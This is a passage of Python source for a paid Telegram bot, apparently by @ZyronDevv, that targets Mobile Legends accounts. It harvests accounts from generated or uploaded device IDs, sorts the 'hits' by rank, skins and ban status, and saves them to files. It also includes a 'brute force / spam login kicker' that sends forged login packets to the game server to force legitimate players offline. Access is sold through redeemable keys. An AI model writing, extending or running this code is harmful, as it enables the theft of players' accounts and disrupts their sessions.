    if not os.path.exists(filepath): return False
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return device_id in f.read()
    except: return False

def format_account_card(device, acc, zone, player_data) -> str:
    lines = [
        "═" * 60,
        f"Device ID    : {device}",
        f"Account      : {acc} ({zone})",
        f"Nickname     : {player_data.get('nickname', 'N/A')} (Lv.{player_data.get('level', 'N/A')})",
        f"Status       : NORMAL",
        f"Rank         : {player_data.get('current_rank', 'Unranked')}",
        f"Max Rank     : {player_data.get('highest_rank', 'N/A')}",
        f"Heroes       : {player_data.get('hero_count', 0)}",
        f"Skins        : {player_data.get('skin_count', 0)}",
        f"V2L Status   : {player_data.get('v2l_status', 'N/A')}",
        f"Created      : {player_data.get('created_at', 'N/A')}",
        "═" * 60,
    ]
    return "\n".join(lines)

def save_account(account_info: dict, player_data: dict, mode="detail"):
    global HIT_COUNTERS
    device = account_info.get('Device id', '')
    acc, zone = account_info.get('role_id', '?'), account_info.get('zone_id', '?')
    ban_stat = player_data.get('ban_status', 'NORMAL')
    is_banned = 'ban' in str(ban_stat).lower()
    
    if is_banned:
        banned_file = os.path.join(OUTPUT_DIR, FOLDERS["error"], "banned_accounts.txt")
        with save_lock:
            with open(banned_file, "a", encoding='utf-8') as f:
                f.write(f"{device} | {acc}:{zone} | {ban_stat}\n")
        with COUNTER_LOCK:
            HIT_COUNTERS['banned'] += 1
        return
    
    nick = player_data.get('nickname', 'N/A')
    if str(nick).lower() in ("unknown", "guest", ""):
        return
    
    level = player_data.get('level', 'N/A')
    skin = player_data.get('skin_count', 0)
    hero = player_data.get('hero_count', 0)
    v2l = player_data.get('v2l_status', 'N/A')
    v2l_text = "ACTIVE" if str(v2l).lower() in ('enabled', 'yes', '1', 'true') else \
               "INACTIVE" if str(v2l).lower() in ('disabled', 'no', '0', 'false') else "N/A"
    cur_rank = player_data.get('current_rank', 'Unranked')
    rank_category = get_rank_category(cur_rank)
    rank_folder = get_rank_file(rank_category)
    card_text = format_account_card(device, acc, zone, player_data)
    
    with save_lock:
        all_file = FILES["all_hits_detail"]
        if not is_already_saved(device, all_file):
            with open(all_file, "a", encoding='utf-8') as f:
                f.write(card_text + "\n")
        raw_file = FILES["raw_devices_detail"]
        if not is_already_saved(device, raw_file):
            with open(raw_file, "a", encoding='utf-8') as f:
                f.write(f"{device}\n")
        if rank_folder and not is_already_saved(device, rank_folder):
            with open(rank_folder, "a", encoding='utf-8') as f:
                f.write(card_text + "\n")
        if v2l_text == "ACTIVE":
            v2l_file = os.path.join(OUTPUT_DIR, FOLDERS["v2l_active"], "v2l_active.txt")
            if not is_already_saved(device, v2l_file):
                with open(v2l_file, "a", encoding='utf-8') as f:
                    f.write(card_text + "\n")
            with COUNTER_LOCK: HIT_COUNTERS['v2l_active'] += 1
        elif v2l_text == "INACTIVE":
            v2l_file = os.path.join(OUTPUT_DIR, FOLDERS["v2l_inactive"], "v2l_inactive.txt")
            if not is_already_saved(device, v2l_file):
                with open(v2l_file, "a", encoding='utf-8') as f:
                    f.write(card_text + "\n")
            with COUNTER_LOCK: HIT_COUNTERS['v2l_inactive'] += 1
        if skin >= 200:
            sultan_file = os.path.join(OUTPUT_DIR, FOLDERS["sultan"], "sultan.txt")
            if not is_already_saved(device, sultan_file):
                with open(sultan_file, "a", encoding='utf-8') as f:
                    f.write(card_text + "\n")
            with COUNTER_LOCK: HIT_COUNTERS['sultan'] += 1
    
    with COUNTER_LOCK:
        if rank_category in HIT_COUNTERS:
            HIT_COUNTERS[rank_category] += 1

# ────────────────────────────────────────────────────────────────
# 8. DETAIL CHECK ENGINE
# ────────────────────────────────────────────────────────────────

def process_detail(device_id: str, account_id: int, zone_id: int) -> Optional[dict]:
    try:
        with GameConnection(device_id=device_id) as conn:
            if not conn.login_to_login_server():
                if 'ban' in conn.ban_status.lower():
                    save_account(
                        {'Device id': device_id, 'role_id': account_id, 'zone_id': zone_id},
                        {'ban_status': conn.ban_status, 'nickname': 'BANNED'}, "detail"
                    )
                return None
            if not conn.get_game_server(): return None
            if not conn.connect_to_game_server(): return None
            
            skin_info = conn.get_skin_role_info(account_id, zone_id)
            ban_stat = conn.check_ban_status()
            
            if 'ban' in ban_stat.lower():
                save_account(
                    {'Device id': device_id, 'role_id': account_id, 'zone_id': zone_id},
                    {'ban_status': ban_stat, 'nickname': 'BANNED'}, "detail"
                )
                return None
                
            v2l = get_v2l_status(conn, account_id, zone_id)
            result = conn.lookup_player(account_id)
            role_info = conn.get_role_info(account_id, zone_id)
            
            pd = {}
            if result and isinstance(result, dict):
                if isinstance(result.get(0), list) and len(result[0]) > 0:
                    if isinstance(result[0][0], dict):
                        pd = result[0][0]
                    elif isinstance(result[0][0], SdpStruct):
                        pd = dict(result[0][0])
                elif isinstance(result.get(0), dict):
                    pd = result[0]
                elif isinstance(result.get(0), SdpStruct):
                    pd = dict(result[0])
                else:
                    pd = result
            
            if not isinstance(pd, dict):
                pd = {}

            skin_info = skin_info if isinstance(skin_info, dict) else {}
            role_info = role_info if isinstance(role_info, dict) else {}
            
            nick = pd.get(2) or skin_info.get(2) or role_info.get(2)
            
            if not nick or str(nick).lower() in ("unknown", "guest", ""):
                for key, value in pd.items():
                    if isinstance(value, str) and len(value) > 1 and not value.isdigit():
                        if value.lower() not in ("unknown", "guest", "null", "none"):
                            nick = value
                            break
            
            if not nick or str(nick).lower() in ("unknown", "guest", ""):
                if not pd and not skin_info and not role_info:
                    return None
                nick = f"Player_{account_id}"

            level = pd.get(3) or skin_info.get(3) or role_info.get(3) or 1
            
            skin_cnt = 0
            if skin_info and skin_info.get(10) is not None:
                skin_cnt = skin_info.get(10)
            elif pd.get(83) is not None:
                skin_cnt = pd.get(83)
                
            hero_cnt = 0
            if skin_info and skin_info.get(9) is not None:
                hero_cnt = skin_info.get(9)
            elif role_info and role_info.get(9) is not None:
                hero_cnt = role_info.get(9)
            elif pd.get(9) is not None:
                hero_cnt = pd.get(9)

            cur_rank_val = pd.get(8) or skin_info.get(6, 0) or role_info.get(8, 0) or 0
            max_rank_val = pd.get(95) or skin_info.get(15, 0) or role_info.get(9, 0) or 0
            
            created_raw = pd.get(42) or conn.creation_ts
            created_at = ""
            if created_raw and isinstance(created_raw, (int, float)) and created_raw > 0:
                try:
                    dt = datetime.fromtimestamp(created_raw, tz=timezone.utc).astimezone(TZ_WIB)
                    created_at = dt.strftime("%Y-%m-%d %H:%M:%S WIB")
                except:
                    pass
            
            player_data = {
                'nickname': nick, 
                'level': level, 
                'skin_count': skin_cnt,
                'hero_count': hero_cnt, 
                'current_rank': map_rank(cur_rank_val),
                'highest_rank': map_rank(max_rank_val) if max_rank_val else map_rank(cur_rank_val),
                'ban_status': ban_stat, 
                'v2l_status': v2l, 
                'created_at': created_at,
            }
            
            save_account(
                {'Device id': device_id, 'role_id': account_id, 'zone_id': zone_id},
                player_data, "detail"
            )
            return player_data
            
    except Exception as e:
        return None

# ────────────────────────────────────────────────────────────────
# 9. BRUTE FORCE / SPAM KICKER
# ────────────────────────────────────────────────────────────────

def fetch_session_profile(device_id: str) -> Optional[Dict[str, Any]]:
    acc, zone, stat = GameLogin(device_id).run()
    if not acc or not zone:
        return None
    try:
        conn = GameConnection(device_id=device_id)
        if not conn.login_to_login_server(): return None
        if not conn.get_game_server() or not conn.connect_to_game_server(): return None
        sess_key = conn.session_key
        gs_host = conn.game_host
        gs_port = conn.game_port
        creation_ts = conn.creation_ts
        skin_info = conn.get_skin_role_info(acc, zone)
        ban_stat = conn.check_ban_status()
        conn.cleanup()
        skin_info = skin_info if isinstance(skin_info, dict) else {}
        nick = skin_info.get(2) or f"Player_{acc}"
        level = skin_info.get(3) or 1
        skin_cnt = skin_info.get(10) if (skin_info and skin_info.get(10) is not None) else 0
        hero_cnt = skin_info.get(9) if (skin_info and skin_info.get(9) is not None) else 0
        cur_rank_val = skin_info.get(6, 0) or 0
        max_rank_val = skin_info.get(15, 0) or cur_rank_val
        return {
            'device_id': device_id, 'account_id': acc, 'session_key': sess_key,
            'zone_id': zone, 'creation_ts': creation_ts,
            'game_host': gs_host, 'game_port': gs_port, 'gs_info': f"{gs_host}:{gs_port}",
            'nickname': nick, 'level': level,
            'rank': map_rank(cur_rank_val),
            'highest_rank': map_rank(max_rank_val) if max_rank_val else map_rank(cur_rank_val),
            'skin_count': skin_cnt, 'hero_count': hero_cnt, 'ban_status': ban_stat,
        }
    except:
        return None

def send_session_kick(profile: Dict[str, Any], timeout: float = 4.5) -> Tuple[bool, float, str]:
    t0 = time.time()
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((profile['game_host'], profile['game_port']))
        body_struct = SdpStruct({
            0: profile['account_id'], 1: profile['session_key'],
            2: profile['zone_id'], 4: CLIENT_VERSION, 13: CHANNEL,
            15: profile['device_id']
        }).data
        pkt = SdpStruct({0: 10001, 1: 1, 5: body_struct}).data
        comp = zstd.compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        sock.send(flags.to_bytes(4, 'big') + comp)
        q = b''
        got_ack = False
        while len(q) < 4:
            d = sock.recv(4096)
            if not d: break
            q += d
        if len(q) >= 4:
            fl = int.from_bytes(q[:4], 'big')
            sz = fl & 0xFFFFFF
            while len(q) < sz:
                d = sock.recv(4096)
                if not d: break
                q += d
            if len(q) >= sz:
                got_ack = True
        elapsed_ms = (time.time() - t0) * 1000
        sock.close()
        return True, elapsed_ms, ("ACK RECEIVED" if got_ack else "SENT OK")
    except socket.timeout:
        elapsed_ms = (time.time() - t0) * 1000
        if sock:
            try: sock.close()
            except: pass
        return False, elapsed_ms, "TIMEOUT"
    except Exception as e:
        elapsed_ms = (time.time() - t0) * 1000
        if sock:
            try: sock.close()
            except: pass
        return False, elapsed_ms, str(e)

# ────────────────────────────────────────────────────────────────
# 10. CONVERSATION STATES
# ────────────────────────────────────────────────────────────────

(
    STATE_BF_CUSTOM_LOOPS,
    STATE_BF_CUSTOM_DELAY,
    STATE_ADMIN_DELETE_KEY,
    STATE_ADMIN_REVOKE_USER,
    STATE_ADMIN_BROADCAST,
    STATE_ADMIN_ADDUSER_ID,
) = range(6)

# ────────────────────────────────────────────────────────────────
# 11. HELPERS & KEYBOARDS
# ────────────────────────────────────────────────────────────────

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

def escape_html(text: str) -> str:
    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def main_menu_keyboard() -> InlineKeyboardMarkup:
    """Advanced main menu with better organization"""
    kb = [
        [InlineKeyboardButton("🔨 Generate", callback_data="gen_menu"),
         InlineKeyboardButton("🔍 Single Check", callback_data="single_menu"),
         InlineKeyboardButton("📂 Bulk Check", callback_data="bulk_menu")],
        [InlineKeyboardButton("⚡ BruteForce", callback_data="bf_menu"),
         InlineKeyboardButton("📊 Statistics", callback_data="stats"),
         InlineKeyboardButton("👤 Profile", callback_data="profile")],
        [InlineKeyboardButton("📁 My Files", callback_data="files"),
         InlineKeyboardButton("ℹ️ Help", callback_data="help"),
         InlineKeyboardButton("🛠️ Admin", callback_data="admin")]
    ]
    return InlineKeyboardMarkup(kb)

def admin_panel_keyboard() -> InlineKeyboardMarkup:
    kb = [
        [InlineKeyboardButton("🔑 Generate Key", callback_data="admin_genkey"),
         InlineKeyboardButton("📋 List Keys", callback_data="admin_listkeys")],
        [InlineKeyboardButton("👥 List Users", callback_data="admin_listusers"),
         InlineKeyboardButton("🗑️ Delete Key", callback_data="admin_delkey")],
        [InlineKeyboardButton("🚫 Revoke User", callback_data="admin_revoke"),
         InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
        [InlineKeyboardButton("➕ Add User", callback_data="admin_adduser"),
         InlineKeyboardButton("📊 Bot Stats", callback_data="admin_botstats")],
        [InlineKeyboardButton("📁 My Files", callback_data="files"),
         InlineKeyboardButton("⚡ BF Limits", callback_data="admin_bf_limits")],
        [InlineKeyboardButton("🔙 Back to Main", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(kb)

def bf_limits_admin_keyboard() -> InlineKeyboardMarkup:
    current_limit = get_bf_limit()
    kb = [
        [InlineKeyboardButton(f"📊 Global Limit: {current_limit}", callback_data="admin_bf_show")],
        [InlineKeyboardButton("✏️ Set Global Limit", callback_data="admin_bf_set")],
        [InlineKeyboardButton("👤 Set User-Specific Limit", callback_data="admin_bf_set_user")],
        [InlineKeyboardButton("🗑️ Clear All Users BF History", callback_data="admin_bf_clear_all")],
        [InlineKeyboardButton("🧹 Clear Specific User BF History", callback_data="admin_bf_clear_user")],
        [InlineKeyboardButton("📋 View BF Usage Stats", callback_data="admin_bf_stats")],
        [InlineKeyboardButton("🔙 Back to Admin", callback_data="admin")]
    ]
    return InlineKeyboardMarkup(kb)

def back_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]])

def confirm_keyboard(action: str, data: str = "") -> InlineKeyboardMarkup:
    """Confirmation dialog keyboard"""
    kb = [
        [InlineKeyboardButton("✅ Yes", callback_data=f"confirm_{action}_{data}"),
         InlineKeyboardButton("❌ No", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(kb)

# ────────────────────────────────────────────────────────────────
# 12. COMMAND HANDLERS
# ────────────────────────────────────────────────────────────────

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    username = user.username or user.first_name or "Unknown"
    
    valid, user_data = is_user_authorized(user_id)
    
    if is_admin(user_id):
        text = (
            f"🤖 <b>PREMIUM DEVICE ID BOT V2.0</b>\n"
            f"═══════════════════════════\n"
            f"👋 Welcome back, <b>Admin</b>!\n"
            f"🆔 ID: <code>{user_id}</code>\n"
            f"👤 Name: {username}\n"
            f"♾️ Access: <b>Lifetime (Admin)</b>\n"
            f"═══════════════════════════\n"
            f"🚀 <b>Enhanced Features:</b>\n"
            f"• Bulk check up to 100,000 devices\n"
            f"• Real-time job status tracking\n"
            f"• Advanced button system\n"
            f"• Session-based file outputs\n"
            f"═══════════════════════════\n"
            f"Choose an option below 👇"
        )
        await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard())
    elif valid:
        expiry = get_user_expiry_info(user_id)
        used_count, limit = get_user_bf_usage_stats(user_id)
        active_jobs = get_user_active_jobs(user_id)
        jobs_text = f"\n⚙️ Active Jobs: {len(active_jobs)}" if active_jobs else ""
        text = (
            f"🤖 <b>PREMIUM DEVICE ID BOT V2.0</b>\n"
            f"═══════════════════════════\n"
            f"👋 Welcome, <b>{escape_html(username)}</b>!\n"
            f"🆔 ID: <code>{user_id}</code>\n"
            f"═══════════════════════════\n"
            f"📋 <b>Your Access:</b>\n{expiry}\n"
            f"═══════════════════════════\n"
            f"⚡ <b>BF Usage:</b> {used_count}/{limit}{jobs_text}\n"
            f"═══════════════════════════\n"
            f"Choose an option below 👇"
        )
        await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard())
    else:
        text = (
            f"🤖 <b>PREMIUM DEVICE ID BOT V2.0</b>\n"
            f"═══════════════════════════\n"
            f"👋 Hello, <b>{escape_html(username)}</b>!\n"
            f"🆔 ID: <code>{user_id}</code>\n"
            f"═══════════════════════════\n"
            f"🔒 <b>ACCESS REQUIRED</b>\n\n"
            f"This bot requires an access key.\n"
            f"Use /redeem &lt;KEY&gt; to activate your access.\n\n"
            f"📡 <b>Get a key from:</b> @ZyronDevv\n"
            f"═══════════════════════════\n"
            f"✨ Created by: @ZyronDevv"
        )
        await update.message.reply_text(text, parse_mode=ParseMode.HTML)

async def cmd_about(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """About the bot"""
    text = (
        "ℹ️ <b>ABOUT THIS BOT</b>\n"
        "═══════════════════════════\n"
        "🤖 <b>Premium Device ID Bot V2.0</b>\n\n"
        "This bot provides advanced device ID checking, "
        "brute force capabilities, and bulk processing for "
        "Mobile Legends accounts.\n\n"
        "📊 <b>Features:</b>\n"
        "• Generate realistic device IDs\n"
        "• Single & bulk account checking\n"
        "• 8-request full detail per account\n"
        "• Rank classification system\n"
        "• V2L status detection\n"
        "• Brute force / session kicker\n"
        "• Bulk job status tracking\n"
        "• Session-based file outputs\n\n"
        "👨‍💻 <b>Developer:</b> @ZyronDevv\n"
        "📅 <b>Version:</b> 2.0\n"
        "═══════════════════════════\n"
        "✨ Created by: @ZyronDevv"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=back_keyboard())

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check bulk job status"""
    user_id = update.effective_user.id
    
    # Check if user specified a job ID
    if context.args:
        job_id = context.args[0].strip()
        job = get_bulk_job(job_id)
        if not job:
            await update.message.reply_text(
                f"❌ Job <code>{job_id}</code> not found!",
                parse_mode=ParseMode.HTML
            )
            return
        if job.get("user_id") != user_id and not is_admin(user_id):
            await update.message.reply_text("🔒 You can only check your own jobs!")
            return
        
        await show_job_status(update, context, job)
        return
    
    # Show all active jobs for this user
    active_jobs = get_user_active_jobs(user_id)
    
    if not active_jobs:
        await update.message.reply_text(
            "📊 <b>No active bulk jobs</b>\n\n"
            "Start a bulk check by uploading a .txt file "
            "using /bulk or the Bulk Check menu option.",
            parse_mode=ParseMode.HTML,
            reply_markup=back_keyboard()
        )
        return
    
    text = "📊 <b>YOUR ACTIVE JOBS</b>\n═══════════════════════════\n"
    for job in active_jobs:
        progress = (job['processed'] / job['total'] * 100) if job['total'] > 0 else 0
        text += (
            f"🆔 <code>{job['job_id']}</code>\n"
            f"   📈 {job['processed']:,}/{job['total']:,} ({progress:.1f}%)\n"
            f"   ✅ Hits: {job['hits']:,} | ❌ Failed: {job['failed']:,}\n"
            f"   ⏱️ Started: {job['started_at'][:19]}\n\n"
        )
    text += "═══════════════════════════"
    
    kb = []
    for job in active_jobs:
        kb.append([InlineKeyboardButton(
            f"📊 {job['job_id']} ({job['processed']}/{job['total']})",
            callback_data=f"jobstatus_{job['job_id']}"
        )])
    kb.append([InlineKeyboardButton("🔙 Back", callback_data="main_menu")])
    
    await update.message.reply_text(
        text,
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(kb)
    )

async def show_job_status(update: Update, context: ContextTypes.DEFAULT_TYPE, job: dict):
    """Show detailed job status"""
    elapsed = time.time() - datetime.fromisoformat(job['started_at']).timestamp()
    speed = job['processed'] / elapsed if elapsed > 0 else 0
    progress = (job['processed'] / job['total'] * 100) if job['total'] > 0 else 0
    eta = (job['total'] - job['processed']) / speed if speed > 0 else 0
    
    text = (
        f"📊 <b>JOB STATUS: {job['job_id']}</b>\n"
        f"═══════════════════════════\n"
        f"📈 Progress: {job['processed']:,}/{job['total']:,} ({progress:.1f}%)\n"
        f"✅ Hits: {job['hits']:,}\n"
        f"❌ Failed: {job['failed']:,}\n"
        f"⚡ Speed: {speed:.1f}/s\n"
        f"⏱️ ETA: {eta/60:.1f} minutes\n"
        f"📅 Started: {job['started_at'][:19]}\n"
        f"🔄 Status: {job['status'].upper()}\n"
        f"═══════════════════════════"
    )
    
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🛑 Cancel Job", callback_data=f"canceljob_{job['job_id']}")],
        [InlineKeyboardButton("🔙 Back", callback_data="status_menu")]
    ])
    
    if hasattr(update, 'callback_query') and update.callback_query:
        await update.callback_query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
    else:
        await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)

async def cmd_bfstop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop a running brute force"""
    user_id = update.effective_user.id
    device_id = context.user_data.get('bf_device', '')
    
    if not device_id:
        # Check for any active sessions
        active = []
        with bf_sessions_lock:
            for key, session in active_bf_sessions.items():
                if key.startswith(f"{user_id}_"):
                    active.append(key)
        
        if not active:
            await update.message.reply_text(
                "❌ No active brute force sessions found.",
                reply_markup=main_menu_keyboard()
            )
            return
        
        # Stop all active sessions for this user
        for key in active:
            with bf_sessions_lock:
                if key in active_bf_sessions:
                    active_bf_sessions[key]["stop"] = True
                    active_bf_sessions[key]["refunded"] = True
            device = key.split('_', 1)[1] if '_' in key else ''
            if device and not is_admin(user_id):
                refund_user_bf_device(user_id, device)
        
        await update.message.reply_text(
            f"🛑 <b>Stopped {len(active)} brute force session(s)</b>\n"
            f"♻️ Usage refunded for all sessions.",
            parse_mode=ParseMode.HTML,
            reply_markup=main_menu_keyboard()
        )
        return
    
    session_key = f"{user_id}_{device_id}"
    with bf_sessions_lock:
        if session_key in active_bf_sessions:
            active_bf_sessions[session_key]["stop"] = True
            active_bf_sessions[session_key]["refunded"] = True
    
    context.user_data["bf_stop_flag"] = True
    context.user_data["bf_refunded"] = True
    
    refunded = False
    if not is_admin(user_id):
        if refund_user_bf_device(user_id, device_id):
            refunded = True
    
    msg = "🛑 <b>Stopping brute force...</b>"
    if refunded:
        msg += "\n♻️ <b>Usage refunded (+1 remaining)</b>"
    
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard())

async def cmd_bfstatus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show current brute force status"""
    user_id = update.effective_user.id
    
    active_sessions = []
    with bf_sessions_lock:
        for key, session in active_bf_sessions.items():
            if key.startswith(f"{user_id}_"):
                device = key.split('_', 1)[1] if '_' in key else 'unknown'
                active_sessions.append({
                    'device': device,
                    'running': session.get('running', False)
                })
    
    if not active_sessions:
        await update.message.reply_text(
            "📊 <b>No active brute force sessions</b>\n\n"
            "Start one using /bruteforce or the menu button.",
            parse_mode=ParseMode.HTML,
            reply_markup=main_menu_keyboard()
        )
        return
    
    used_count, limit = get_user_bf_usage_stats(user_id)
    
    text = (
        f"⚡ <b>BRUTE FORCE STATUS</b>\n"
        f"═══════════════════════════\n"
        f"📊 Your Usage: {used_count}/{limit}\n"
        f"═══════════════════════════\n"
        f"<b>Active Sessions:</b>\n"
    )
    
    for session in active_sessions:
        status = "🟢 Running" if session['running'] else "🔴 Stopped"
        text += f"📱 <code>{session['device'][:32]}...</code>\n   {status}\n"
    
    text += "═══════════════════════════"
    
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🛑 Stop All", callback_data="bf_stop_all")],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
    ])
    
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)

async def cmd_single(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command to check a single device ID"""
    if context.args:
        device_id = context.args[0].strip()
        # Process directly
        await process_single_device(update, context, device_id)
    else:
        context.user_data["waiting_for_single_check"] = True
        context.user_data["waiting_for_bruteforce"] = False
        await update.message.reply_text(
            "🔍 <b>SINGLE ACCOUNT CHECK</b>\n"
            "═══════════════════════════\n"
            "Send me a <b>Device ID</b> to check.\n\n"
            "Usage: <code>/single and_xxxx...</code>\n"
            "Or just send the device ID directly.\n\n"
            "Type /cancel to abort.",
            parse_mode=ParseMode.HTML
        )

async def cmd_bulk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command to start bulk check"""
    context.user_data["waiting_for_bulk"] = True
    await update.message.reply_text(
        f"📂 <b>BULK CHECK (MAX {MAX_BULK_DEVICES:,})</b>\n"
        "═══════════════════════════\n"
        "📤 <b>Upload a .txt file</b> containing device IDs (one per line).\n\n"
        "🔍 The bot will:\n"
        "• Check each device with 8 requests\n"
        "• Sort accounts by rank\n"
        "• Detect V2L status\n"
        "• Filter banned accounts\n"
        "• Auto-upload result files when complete\n"
        f"• Max {MAX_BULK_DEVICES:,} devices per file\n\n"
        "💡 Use /status to check job progress\n"
        "Type /cancel to abort.",
        parse_mode=ParseMode.HTML
    )

async def cmd_bruteforce(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command to start brute force"""
    if context.args:
        device_id = context.args[0].strip()
        context.user_data["waiting_for_bruteforce"] = True
        # Simulate device input
        await process_bf_device(update, context, device_id)
    else:
        context.user_data["waiting_for_bruteforce"] = True
        context.user_data["waiting_for_single_check"] = False
        
        user_id = update.effective_user.id
        used_count, limit = get_user_bf_usage_stats(user_id)
        remaining = limit - used_count if limit > 0 else "Unlimited"
        
        await update.message.reply_text(
            f"⚡ <b>BRUTE FORCE / SPAM LOGIN KICKER</b>\n"
            f"═══════════════════════════\n"
            f"🔢 Used: {used_count}/{limit} devices\n"
            f"📊 Remaining: {remaining}\n"
            f"═══════════════════════════\n"
            f"Send me a <b>Device ID</b> to target.\n\n"
            f"Usage: <code>/bruteforce and_xxxx...</code>\n"
            f"Or just send the device ID directly.\n\n"
            f"Type /cancel to abort.",
            parse_mode=ParseMode.HTML
        )

async def cmd_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    username = user.username or user.first_name or "Unknown"
    
    if not context.args:
        await update.message.reply_text(
            "🔑 <b>Key Redemption</b>\n\n"
            "Usage: <code>/redeem YOUR-KEY-HERE</code>\n\n"
            "Get a key from @ZyronDevv",
            parse_mode=ParseMode.HTML
        )
        return
    
    key_code = context.args[0].strip().upper()
    success, msg = redeem_key(key_code, user_id, username)
    
    if success:
        expiry = get_user_expiry_info(user_id)
        text = (
            f"✅ <b>ACCESS ACTIVATED!</b>\n"
            f"═══════════════════════════\n"
            f"🎉 Congratulations, <b>{escape_html(username)}</b>!\n"
            f"Your access has been activated.\n\n"
            f"{expiry}\n"
            f"═══════════════════════════\n"
            f"Type /start to access the bot menu."
        )
        await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard())
    else:
        await update.message.reply_text(f"❌ <b>Redemption Failed</b>\n\n{msg}", parse_mode=ParseMode.HTML)

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    valid, _ = is_user_authorized(user_id)
    
    text = (
        "ℹ️ <b>HELP & COMMANDS</b>\n"
        "═══════════════════════════\n\n"
        "<b>Available Commands:</b>\n"
        "• /start - Show this message\n"
        "• /help - Show help\n"
        "• /about - About this bot\n"
        "• /single - Check a single device ID\n"
        "• /bulk - Upload file for bulk check\n"
        "• /status - Check bulk job status\n"
        "• /cancel - Cancel a running bulk job\n"
        "• /redeem - Redeem subscription key\n"
        "• /mykey - Check subscription status\n"
        "• /bruteforce - Brute force / spam login kicker\n"
        "• /bfstop - Stop a running brute force\n"
        "• /bfstatus - Show current brute force status\n\n"
        "<b>Device ID Format:</b>\n"
        "<code>and_a1b2c3d4e5f6...</code>\n\n"
        "<b>Features:</b>\n"
        "🔨 Generate Devices - Create random device IDs\n"
        "🔍 Single Check - Check one device\n"
        "📂 Bulk Check - Upload .txt file (max 100K)\n"
        "⚡ Brute Force - Spam login kicker\n"
        "📊 Statistics - View hit counters\n"
        "📁 My Files - Download result files\n"
        "👤 My Profile - View your access info\n\n"
        "═══════════════════════════\n"
        "✨ Created by: @ZyronDevv"
    )
    
    if valid or is_admin(user_id):
        await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard())
    else:
        await update.message.reply_text(text, parse_mode=ParseMode.HTML)

async def cmd_mykey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    expiry = get_user_expiry_info(user_id)
    used_count, limit = get_user_bf_usage_stats(user_id)
    active_jobs = get_user_active_jobs(user_id)
    
    text = (
        f"👤 <b>YOUR ACCESS INFO</b>\n"
        f"═══════════════════════════\n"
        f"🆔 User ID: <code>{user_id}</code>\n"
        f"{expiry}\n"
        f"═══════════════════════════\n"
        f"⚡ <b>Brute Force Usage:</b>\n"
        f"  📊 Used: {used_count}/{limit}\n"
        f"  💡 Each device can only be used once\n"
        f"  ♻️ Usage is refunded if you cancel/stop\n"
    )
    
    if active_jobs:
        text += f"═══════════════════════════\n📊 <b>Active Bulk Jobs:</b> {len(active_jobs)}\n"
        for job in active_jobs:
            progress = (job['processed'] / job['total'] * 100) if job['total'] > 0 else 0
            text += f"  🆔 {job['job_id']}: {progress:.1f}%\n"
    
    text += "═══════════════════════════"
    
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=back_keyboard())

async def cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["waiting_for_single_check"] = False
    context.user_data["waiting_for_bruteforce"] = False
    context.user_data["waiting_for_bulk"] = False
    context.user_data["bf_stop_flag"] = True
    context.user_data.pop("admin_bf_action", None)
    context.user_data.pop("bf_target_user_id", None)
    context.user_data.pop("admin_conv_state", None)
    context.user_data.pop("bf_custom_stage", None)
    
    user_id = update.effective_user.id
    device_id = context.user_data.get("bf_device", "")
    
    refunded = False
    if device_id and not is_admin(user_id):
        if refund_user_bf_device(user_id, device_id):
            refunded = True
    
    session_key = f"{user_id}_{device_id}"
    with bf_sessions_lock:
        if session_key in active_bf_sessions:
            active_bf_sessions[session_key]["stop"] = True
            active_bf_sessions[session_key]["refunded"] = True
    
    context.user_data["bf_refunded"] = True
    
    msg = "❌ Operation cancelled."
    if refunded:
        msg += "\n♻️ Brute force usage refunded (+1 remaining)."
    
    await update.message.reply_text(msg, reply_markup=main_menu_keyboard())
    return ConversationHandler.END

# ────────────────────────────────────────────────────────────────
# 13. CALLBACK HANDLER
# ────────────────────────────────────────────────────────────────

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = update.effective_user.id
    
    # Handle job status callbacks (no auth needed for own jobs)
    if data.startswith("jobstatus_"):
        job_id = data.replace("jobstatus_", "")
        job = get_bulk_job(job_id)
        if job and (job.get("user_id") == user_id or is_admin(user_id)):
            await show_job_status(update, context, job)
